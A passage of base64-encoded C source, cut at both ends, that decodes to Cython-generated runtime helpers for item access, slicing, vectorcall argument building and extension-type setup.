gICAgICAgICAgICAgICAgcHlfc3RhcnQgPSBQeV9Ob25lO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgaWYgKF9weV9zdG9wKSB7XG4gICAgICAgICAgICAgICAgcHlfc3RvcCA9ICpfcHlfc3RvcDtcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgaWYgKGhhc19jc3RvcCkge1xuICAgICAgICAgICAgICAgICAgICBvd25lZF9zdG9wID0gcHlfc3RvcCA9IFB5TG9uZ19Gcm9tU3NpemVfdChjc3RvcCk7XG4gICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghcHlfc3RvcCkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIFB5X1hERUNSRUYob3duZWRfc3RhcnQpO1xuICAgICAgICAgICAgICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9IGVsc2VcbiAgICAgICAgICAgICAgICAgICAgcHlfc3RvcCA9IFB5X05vbmU7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBweV9zbGljZSA9IFB5U2xpY2VfTmV3KHB5X3N0YXJ0LCBweV9zdG9wLCBQeV9Ob25lKTtcbiAgICAgICAgICAgIFB5X1hERUNSRUYob3duZWRfc3RhcnQpO1xuICAgICAgICAgICAgUHlfWERFQ1JFRihvd25lZF9zdG9wKTtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghcHlfc2xpY2UpKSBnb3RvIGJhZDtcbiAgICAgICAgfVxuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICAgICAgICByZXN1bHQgPSBtcC0+bXBfc3Vic2NyaXB0KG9iaiwgcHlfc2xpY2UpO1xuI2Vsc2VcbiAgICAgICAgcmVzdWx0ID0gUHlPYmplY3RfR2V0SXRlbShvYmosIHB5X3NsaWNlKTtcbiNlbmRpZlxuICAgICAgICBpZiAoIV9weV9zbGljZSkge1xuICAgICAgICAgICAgUHlfREVDUkVGKHB5X3NsaWNlKTtcbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbiAgICBvYmpfdHlwZV9uYW1lID0gX19QeXhfUHlUeXBlX0dldEZ1bGx5UXVhbGlmaWVkTmFtZShQeV9UWVBFKG9iaikpO1xuICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICJcJyIgX19QeXhfRk1UX1RZUEVOQU1FICJcJyBvYmplY3QgaXMgdW5zbGljZWFibGUiLCBvYmpfdHlwZV9uYW1lKTtcbiAgICBfX1B5eF9ERUNSRUZfVHlwZU5hbWUob2JqX3R5cGVfbmFtZSk7XG5iYWQ6XG4gICAgcmV0dXJuIE5VTEw7XG59XG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZXRJdGVtSW50X0dlbmVyaWMoUHlPYmplY3QgKm8sIFB5T2JqZWN0KiBqKSB7XG4gICAgUHlPYmplY3QgKnI7XG4gICAgaWYgKHVubGlrZWx5KCFqKSkgcmV0dXJuIE5VTEw7XG4gICAgciA9IFB5T2JqZWN0X0dldEl0ZW0obywgaik7XG4gICAgUHlfREVDUkVGKGopO1xuICAgIHJldHVybiByO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0dldEl0ZW1JbnRfTGlzdF9GYXN0KFB5T2JqZWN0ICpvLCBQeV9zc2l6ZV90IGksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENZVEhPTl9OQ1BfVU5VU0VEIGludCB3cmFwYXJvdW5kLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDWVRIT05fTkNQX1VOVVNFRCBpbnQgYm91bmRzY2hlY2spIHtcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUyAmJiAhQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGU1xuICAgIFB5X3NzaXplX3Qgd3JhcHBlZF9pID0gaTtcbiAgICBpZiAod3JhcGFyb3VuZCAmIHVubGlrZWx5KGkgPCAwKSkge1xuICAgICAgICB3cmFwcGVkX2kgKz0gUHlMaXN0X0dFVF9TSVpFKG8pO1xuICAgIH1cbiAgICBpZiAoKCFib3VuZHNjaGVjaykgfHwgbGlrZWx5KF9fUHl4X2lzX3ZhbGlkX2luZGV4KHdyYXBwZWRfaSwgUHlMaXN0X0dFVF9TSVpFKG8pKSkpIHtcbiAgICAgICAgUHlPYmplY3QgKnIgPSBQeUxpc3RfR0VUX0lURU0obywgd3JhcHBlZF9pKTtcbiAgICAgICAgUHlfSU5DUkVGKHIpO1xuICAgICAgICByZXR1cm4gcjtcbiAgICB9XG4gICAgcmV0dXJuIF9fUHl4X0dldEl0ZW1JbnRfR2VuZXJpYyhvLCBQeUxvbmdfRnJvbVNzaXplX3QoaSkpO1xuI2Vsc2VcbiAgICByZXR1cm4gUHlTZXF1ZW5jZV9HZXRJdGVtKG8sIGkpO1xuI2VuZGlmXG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfR2V0SXRlbUludF9UdXBsZV9GYXN0KFB5T2JqZWN0ICpvLCBQeV9zc2l6ZV90IGksXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENZVEhPTl9OQ1BfVU5VU0VEIGludCB3cmFwYXJvdW5kLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDWVRIT05fTkNQX1VOVVNFRCBpbnQgYm91bmRzY2hlY2spIHtcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgIFB5X3NzaXplX3Qgd3JhcHBlZF9pID0gaTtcbiAgICBpZiAod3JhcGFyb3VuZCAmIHVubGlrZWx5KGkgPCAwKSkge1xuICAgICAgICB3cmFwcGVkX2kgKz0gUHlUdXBsZV9HRVRfU0laRShvKTtcbiAgICB9XG4gICAgaWYgKCghYm91bmRzY2hlY2spIHx8IGxpa2VseShfX1B5eF9pc192YWxpZF9pbmRleCh3cmFwcGVkX2ksIFB5VHVwbGVfR0VUX1NJWkUobykpKSkge1xuICAgICAgICBQeU9iamVjdCAqciA9IFB5VHVwbGVfR0VUX0lURU0obywgd3JhcHBlZF9pKTtcbiAgICAgICAgUHlfSU5DUkVGKHIpO1xuICAgICAgICByZXR1cm4gcjtcbiAgICB9XG4gICAgcmV0dXJuIF9fUHl4X0dldEl0ZW1JbnRfR2VuZXJpYyhvLCBQeUxvbmdfRnJvbVNzaXplX3QoaSkpO1xuI2Vsc2VcbiAgICByZXR1cm4gUHlTZXF1ZW5jZV9HZXRJdGVtKG8sIGkpO1xuI2VuZGlmXG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfR2V0SXRlbUludF9GYXN0KFB5T2JqZWN0ICpvLCBQeV9zc2l6ZV90IGksIGludCBpc19saXN0LFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDWVRIT05fTkNQX1VOVVNFRCBpbnQgd3JhcGFyb3VuZCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ1lUSE9OX05DUF9VTlVTRUQgaW50IGJvdW5kc2NoZWNrKSB7XG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgJiYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG4gICAgaWYgKGlzX2xpc3QgfHwgUHlMaXN0X0NoZWNrRXhhY3QobykpIHtcbiAgICAgICAgUHlfc3NpemVfdCBuID0gKCghd3JhcGFyb3VuZCkgfCBsaWtlbHkoaSA+PSAwKSkgPyBpIDogaSArIFB5TGlzdF9HRVRfU0laRShvKTtcbiAgICAgICAgaWYgKCghYm91bmRzY2hlY2spIHx8IChsaWtlbHkoX19QeXhfaXNfdmFsaWRfaW5kZXgobiwgUHlMaXN0X0dFVF9TSVpFKG8pKSkpKSB7XG4gICAgICAgICAgICByZXR1cm4gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYobywgbik7XG4gICAgICAgIH1cbiAgICB9XG4gICAgZWxzZSBpZiAoUHlUdXBsZV9DaGVja0V4YWN0KG8pKSB7XG4gICAgICAgIFB5X3NzaXplX3QgbiA9ICgoIXdyYXBhcm91bmQpIHwgbGlrZWx5KGkgPj0gMCkpID8gaSA6IGkgKyBQeVR1cGxlX0dFVF9TSVpFKG8pO1xuICAgICAgICBpZiAoKCFib3VuZHNjaGVjaykgfHwgbGlrZWx5KF9fUHl4X2lzX3ZhbGlkX2luZGV4KG4sIFB5VHVwbGVfR0VUX1NJWkUobykpKSkge1xuICAgICAgICAgICAgUHlPYmplY3QgKnIgPSBQeVR1cGxlX0dFVF9JVEVNKG8sIG4pO1xuICAgICAgICAgICAgUHlfSU5DUkVGKHIpO1xuICAgICAgICAgICAgcmV0dXJuIHI7XG4gICAgICAgIH1cbiAgICB9IGVsc2Uge1xuICAgICAgICBQeU1hcHBpbmdNZXRob2RzICptbSA9IFB5X1RZUEUobyktPnRwX2FzX21hcHBpbmc7XG4gICAgICAgIFB5U2VxdWVuY2VNZXRob2RzICpzbSA9IFB5X1RZUEUobyktPnRwX2FzX3NlcXVlbmNlO1xuICAgICAgICBpZiAobW0gJiYgbW0tPm1wX3N1YnNjcmlwdCkge1xuICAgICAgICAgICAgUHlPYmplY3QgKnIsICprZXkgPSBQeUxvbmdfRnJvbVNzaXplX3QoaSk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIWtleSkpIHJldHVybiBOVUxMO1xuICAgICAgICAgICAgciA9IG1tLT5tcF9zdWJzY3JpcHQobywga2V5KTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihrZXkpO1xuICAgICAgICAgICAgcmV0dXJuIHI7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKGxpa2VseShzbSAmJiBzbS0+c3FfaXRlbSkpIHtcbiAgICAgICAgICAgIGlmICh3cmFwYXJvdW5kICYmIHVubGlrZWx5KGkgPCAwKSAmJiBsaWtlbHkoc20tPnNxX2xlbmd0aCkpIHtcbiAgICAgICAgICAgICAgICBQeV9zc2l6ZV90IGwgPSBzbS0+c3FfbGVuZ3RoKG8pO1xuICAgICAgICAgICAgICAgIGlmIChsaWtlbHkobCA+PSAwKSkge1xuICAgICAgICAgICAgICAgICAgICBpICs9IGw7XG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKCFQeUVycl9FeGNlcHRpb25NYXRjaGVzKFB5RXhjX092ZXJmbG93RXJyb3IpKVxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgICAgICAgICAgICAgIFB5RXJyX0NsZWFyKCk7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICAgICAgcmV0dXJuIHNtLT5zcV9pdGVtKG8sIGkpO1xuICAgICAgICB9XG4gICAgfVxuI2Vsc2VcbiAgICBpZiAoaXNfbGlzdCB8fCAhUHlNYXBwaW5nX0NoZWNrKG8pKSB7XG4gICAgICAgIHJldHVybiBQeVNlcXVlbmNlX0dldEl0ZW0obywgaSk7XG4gICAgfVxuI2VuZGlmXG4gICAgcmV0dXJuIF9fUHl4X0dldEl0ZW1JbnRfR2VuZXJpYyhvLCBQeUxvbmdfRnJvbVNzaXplX3QoaSkpO1xufVxuXG5cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJnKSB7XG4gICAgUHlPYmplY3QgKmFyZ3NbMl0gPSB7TlVMTCwgYXJnfTtcbiAgICByZXR1cm4gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoZnVuYywgYXJncysxLCAxIHwgX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKTtcbn1cblxuXG4jaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5T2JqZWN0X0dldEluZGV4KFB5T2JqZWN0ICpvYmosIFB5T2JqZWN0ICppbmRleCkge1xuICAgIFB5T2JqZWN0ICpydW5lcnIgPSBOVUxMO1xuICAgIFB5X3NzaXplX3Qga2V5X3ZhbHVlO1xuICAgIGtleV92YWx1ZSA9IF9fUHl4X1B5SW5kZXhfQXNTc2l6ZV90KGluZGV4KTtcbiAgICBpZiAobGlrZWx5KGtleV92YWx1ZSAhPSAtMSB8fCAhKHJ1bmVyciA9IFB5RXJyX09jY3VycmVkKCkpKSkge1xuICAgICAgICByZXR1cm4gX19QeXhfR2V0SXRlbUludF9GYXN0KG9iaiwga2V5X3ZhbHVlLCAwLCAxLCAxKTtcbiAgICB9XG4gICAgaWYgKFB5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhydW5lcnIsIFB5RXhjX092ZXJmbG93RXJyb3IpKSB7XG4gICAgICAgIF9fUHl4X1R5cGVOYW1lIGluZGV4X3R5cGVfbmFtZSA9IF9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoUHlfVFlQRShpbmRleCkpO1xuICAgICAgICBQeUVycl9DbGVhcigpO1xuICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfSW5kZXhFcnJvcixcbiAgICAgICAgICAgICJjYW5ub3QgZml0IFwnIiBfX1B5eF9GTVRfVFlQRU5BTUUgIlwnIGludG8gYW4gaW5kZXgtc2l6ZWQgaW50ZWdlciIsIGluZGV4X3R5cGVfbmFtZSk7XG4gICAgICAgIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShpbmRleF90eXBlX25hbWUpO1xuICAgIH1cbiAgICByZXR1cm4gTlVMTDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlPYmplY3RfR2V0SXRlbV9TbG93KFB5T2JqZWN0ICpvYmosIFB5T2JqZWN0ICprZXkpIHtcbiAgICBfX1B5eF9UeXBlTmFtZSBvYmpfdHlwZV9uYW1lO1xuICAgIGlmIChsaWtlbHkoUHlUeXBlX0NoZWNrKG9iaikpKSB7XG4gICAgICAgIFB5T2JqZWN0ICptZXRoID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0ck5vRXJyb3Iob2JqLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2xhc3NfZ2V0aXRlbSk7XG4gICAgICAgIGlmICghbWV0aCkge1xuICAgICAgICAgICAgUHlFcnJfQ2xlYXIoKTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpyZXN1bHQgPSBfX1B5eF9QeU9iamVjdF9DYWxsT25lQXJnKG1ldGgsIGtleSk7XG4gICAgICAgICAgICBQeV9ERUNSRUYobWV0aCk7XG4gICAgICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgICAgICB9XG4gICAgfVxuICAgIG9ial90eXBlX25hbWUgPSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKFB5X1RZUEUob2JqKSk7XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgIlwnIiBfX1B5eF9GTVRfVFlQRU5BTUUgIlwnIG9iamVjdCBpcyBub3Qgc3Vic2NyaXB0YWJsZSIsIG9ial90eXBlX25hbWUpO1xuICAgIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShvYmpfdHlwZV9uYW1lKTtcbiAgICByZXR1cm4gTlVMTDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlPYmplY3RfR2V0SXRlbShQeU9iamVjdCAqb2JqLCBQeU9iamVjdCAqa2V5KSB7XG4gICAgUHlUeXBlT2JqZWN0ICp0cCA9IFB5X1RZUEUob2JqKTtcbiAgICBQeU1hcHBpbmdNZXRob2RzICptbSA9IHRwLT50cF9hc19tYXBwaW5nO1xuICAgIFB5U2VxdWVuY2VNZXRob2RzICpzbSA9IHRwLT50cF9hc19zZXF1ZW5jZTtcbiAgICBpZiAobGlrZWx5KG1tICYmIG1tLT5tcF9zdWJzY3JpcHQpKSB7XG4gICAgICAgIHJldHVybiBtbS0+bXBfc3Vic2NyaXB0KG9iaiwga2V5KTtcbiAgICB9XG4gICAgaWYgKGxpa2VseShzbSAmJiBzbS0+c3FfaXRlbSkpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0dldEluZGV4KG9iaiwga2V5KTtcbiAgICB9XG4gICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0dldEl0ZW1fU2xvdyhvYmosIGtleSk7XG59XG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX1ZFQ1RPUkNBTExcbnN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pIHtcbiAgICAodm9pZClfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbERpY3Q7XG4gICAgaWYgKF9fUHl4X1B5VHVwbGVfU0VUX0lURU0oYnVpbGRlciwgbiwga2V5KSAhPSAoMCkpIHJldHVybiAtMTtcbiAgICBQeV9JTkNSRUYoa2V5KTtcbiAgICBhcmdzW25dID0gdmFsdWU7XG4gICAgcmV0dXJuIDA7XG59XG5DWVRIT05fVU5VU0VEIHN0YXRpYyBpbnQgX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnX0NoZWNrKFB5T2JqZWN0ICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pIHtcbiAgICAodm9pZClfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmdTdHI7XG4gICAgaWYgKHVubGlrZWx5KCFQeVVuaWNvZGVfQ2hlY2soa2V5KSkpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwgImtleXdvcmRzIG11c3QgYmUgc3RyaW5ncyIpO1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIHJldHVybiBfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoa2V5LCB2YWx1ZSwgYnVpbGRlciwgYXJncywgbik7XG59XG5zdGF0aWMgaW50IF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ1N0cihjb25zdCBjaGFyICprZXksIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKmJ1aWxkZXIsIFB5T2JqZWN0ICoqYXJncywgaW50IG4pIHtcbiAgICBQeU9iamVjdCAqcHlLZXkgPSBQeVVuaWNvZGVfRnJvbVN0cmluZyhrZXkpO1xuICAgIGlmICghcHlLZXkpIHJldHVybiAtMTtcbiAgICByZXR1cm4gX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKHB5S2V5LCB2YWx1ZSwgYnVpbGRlciwgYXJncywgbik7XG59XG4jZWxzZSAvLyBDWVRIT05fVkVDVE9SQ0FMTFxuQ1lUSE9OX1VOVVNFRCBzdGF0aWMgaW50IF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ19DaGVjayhQeU9iamVjdCAqa2V5LCBQeU9iamVjdCAqdmFsdWUsIFB5T2JqZWN0ICpidWlsZGVyLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICoqYXJncywgQ1lUSE9OX1VOVVNFRCBpbnQgbikge1xuICAgIGlmICh1bmxpa2VseSghUHlVbmljb2RlX0NoZWNrKGtleSkpKSB7XG4gICAgICAgIFB5RXJyX1NldFN0cmluZyhQeUV4Y19UeXBlRXJyb3IsICJrZXl3b3JkcyBtdXN0IGJlIHN0cmluZ3MiKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICByZXR1cm4gUHlEaWN0X1NldEl0ZW0oYnVpbGRlciwga2V5LCB2YWx1ZSk7XG59XG4jZW5kaWZcblxuXG4jaWYgIUNZVEhPTl9VU0VfVFlQRV9TUEVDUyB8fCAoIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMDAwKVxuI2Vsc2VcbnN0YXRpYyBpbnQgX19QeXhfY2FsbF90eXBlX3RyYXZlcnNlKFB5T2JqZWN0ICpvLCBpbnQgYWx3YXlzX2NhbGwsIHZpc2l0cHJvYyB2aXNpdCwgdm9pZCAqYXJnKSB7XG4gICAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDBcbiAgICBpZiAoX19QeXhfZ2V0X3J1bnRpbWVfdmVyc2lvbigpIDwgMHgwMzA5MDAwMCkgcmV0dXJuIDA7XG4gICAgI2VuZGlmXG4gICAgaWYgKCFhbHdheXNfY2FsbCkge1xuICAgICAgICBQeVR5cGVPYmplY3QgKmJhc2UgPSBfX1B5eF9QeU9iamVjdF9HZXRTbG90KG8sIHRwX2Jhc2UsIFB5VHlwZU9iamVjdCopO1xuICAgICAgICB1bnNpZ25lZCBsb25nIGZsYWdzID0gUHlUeXBlX0dldEZsYWdzKGJhc2UpO1xuICAgICAgICBpZiAoZmxhZ3MgJiBQeV9UUEZMQUdTX0hFQVBUWVBFKSB7XG4gICAgICAgICAgICByZXR1cm4gMDtcbiAgICAgICAgfVxuICAgIH1cbiAgICBQeV9WSVNJVCgoUHlPYmplY3QqKVB5X1RZUEUobykpO1xuICAgIHJldHVybiAwO1xufVxuI2VuZGlmXG5cblxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbnN0YXRpYyBQeV9zc2l6ZV90IF9fUHl4X0dldFR5cGVEaWN0T2Zmc2V0KHZvaWQpIHtcbiAgICBQeU9iamVjdCAqdHBfZGljdG9mZnNldF9vO1xuICAgIFB5X3NzaXplX3QgdHBfZGljdG9mZnNldDtcbiAgICB0cF9kaWN0b2Zmc2V0X28gPSBQeU9iamVjdF9HZXRBdHRyU3RyaW5nKChQeU9iamVjdCopKCZQeVR5cGVfVHlwZSksICJfX2RpY3RvZmZzZXRfXyIpO1xuICAgIGlmICh1bmxpa2VseSghdHBfZGljdG9mZnNldF9vKSkgcmV0dXJuIC0xO1xuICAgIHRwX2RpY3RvZmZzZXQgPSBQeUxvbmdfQXNTc2l6ZV90KHRwX2RpY3RvZmZzZXRfbyk7XG4gICAgUHlfREVDUkVGKHRwX2RpY3RvZmZzZXRfbyk7XG4gICAgaWYgKHVubGlrZWx5KHRwX2RpY3RvZmZzZXQgPT0gMCkpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFxuICAgICAgICAgICAgUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgIlwndHlwZVwnIGRvZXNuXCd0IGhhdmUgYSBkaWN0b2Zmc2V0Iik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KHRwX2RpY3RvZmZzZXQgPCAwKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoXG4gICAgICAgICAgICBQeUV4Y19UeXBlRXJyb3IsXG4gICAgICAgICAgICAiXCd0eXBlXCcgaGFzIGFuIHVuZXhwZWN0ZWQgbmVnYXRpdmUgZGljdG9mZnNldC4gIlxuICAgICAgICAgICAgIlBsZWFzZSByZXBvcnQgdGhpcyBhcyBDeXRob24gYnVnIik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgcmV0dXJuIHRwX2RpY3RvZmZzZXQ7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldFR5cGVEaWN0KFB5VHlwZU9iamVjdCAqdHApIHtcbiAgICBzdGF0aWMgUHlfc3NpemVfdCB0cF9kaWN0b2Zmc2V0ID0gMDtcbiAgICBpZiAodW5saWtlbHkodHBfZGljdG9mZnNldCA9PSAwKSkge1xuICAgICAgICB0cF9kaWN0b2Zmc2V0ID0gX19QeXhfR2V0VHlwZURpY3RPZmZzZXQoKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KHRwX2RpY3RvZmZzZXQgPT0gLTEgJiYgUHlFcnJfT2NjdXJyZWQoKSkpIHtcbiAgICAgICAgICAgIHRwX2RpY3RvZmZzZXQgPSAwOyAvLyB0cnkgYWdhaW4gbmV4dCB0aW1lP1xuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgIH1cbiAgICB9XG4gICAgcmV0dXJuICooUHlPYmplY3QqKikoKGNoYXIqKXRwICsgdHBfZGljdG9mZnNldCk7XG59XG4jZW5kaWZcblxuXG5zdGF0aWMgaW50IF9fUHl4X19TZXRJdGVtT25UeXBlRGljdChQeVR5cGVPYmplY3QgKnRwLCBQeU9iamVjdCAqaywgUHlPYmplY3QgKnYpIHtcbiAgICBpbnQgcmVzdWx0O1xuICAgIFB5T2JqZWN0ICp0cF9kaWN0O1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICB0cF9kaWN0ID0gX19QeXhfR2V0VHlwZURpY3QodHApO1xuICAgIGlmICh1bmxpa2VseSghdHBfZGljdCkpIHJldHVybiAtMTtcbiNlbHNlXG4gICAgdHBfZGljdCA9IHRwLT50cF9kaWN0O1xuI2VuZGlmXG4gICAgcmVzdWx0ID0gUHlEaWN0X1NldEl0ZW0odHBfZGljdCwgaywgdik7XG4gICAgaWYgKGxpa2VseSghcmVzdWx0KSkge1xuICAgICAgICBQeVR5cGVfTW9kaWZpZWQodHApO1xuICAgICAgICBpZiAodW5saWtlbHkoUHlPYmplY3RfSGFzQXR0cih2LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2V0X25hbWUpKSkge1xuICAgICAgICAgICAgUHlPYmplY3QgKnNldE5hbWVSZXN1bHQgPSBQeU9iamVjdF9DYWxsTWV0aG9kT2JqQXJncyh2LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2V0X25hbWUsICAoUHlPYmplY3QgKikgdHAsIGssIE5VTEwpO1xuICAgICAgICAgICAgaWYgKCFzZXROYW1lUmVzdWx0KSByZXR1cm4gLTE7XG4gICAgICAgICAgICBQeV9ERUNSRUYoc2V0TmFtZVJlc3VsdCk7XG4gICAgICAgIH1cbiAgICB9XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cblxuXG5zdGF0aWMgaW50IF9fUHl4X2ZpeF91cF9leHRlbnNpb25fdHlwZV9mcm9tX3NwZWMoUHlUeXBlX1NwZWMgKnNwZWMsIFB5VHlwZU9iamVjdCAqdHlwZSkge1xuI2lmIF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPiAweDAzMDkwMEIxXG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoc3BlYyk7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIodHlwZSk7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoX19QeXhfX1NldEl0ZW1PblR5cGVEaWN0KTtcbiNlbHNlXG4gICAgY29uc3QgUHlUeXBlX1Nsb3QgKnNsb3QgPSBzcGVjLT5zbG90cztcbiAgICBpbnQgY2hhbmdlZCA9IDA7XG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICB3aGlsZSAoc2xvdCAmJiBzbG90LT5zbG90ICYmIHNsb3QtPnNsb3QgIT0gUHlfdHBfbWVtYmVycylcbiAgICAgICAgc2xvdCsrO1xuICAgIGlmIChzbG90ICYmIHNsb3QtPnNsb3QgPT0gUHlfdHBfbWVtYmVycykge1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICAgICAgY29uc3RcbiNlbmRpZiAgLy8gIUNZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTilcbiAgICAgICAgICAgIFB5TWVtYmVyRGVmICptZW1iID0gKFB5TWVtYmVyRGVmKikgc2xvdC0+cGZ1bmM7XG4gICAgICAgIHdoaWxlIChtZW1iICYmIG1lbWItPm5hbWUpIHtcbiAgICAgICAgICAgIGlmIChtZW1iLT5uYW1lWzBdID09IFwnX1wnICYmIG1lbWItPm5hbWVbMV0gPT0gXCdfXCcpIHtcbiAgICAgICAgICAgICAgICBpZiAoc3RyY21wKG1lbWItPm5hbWUsICJfX3dlYWtsaXN0b2Zmc2V0X18iKSA9PSAwKSB7XG4gICAgIC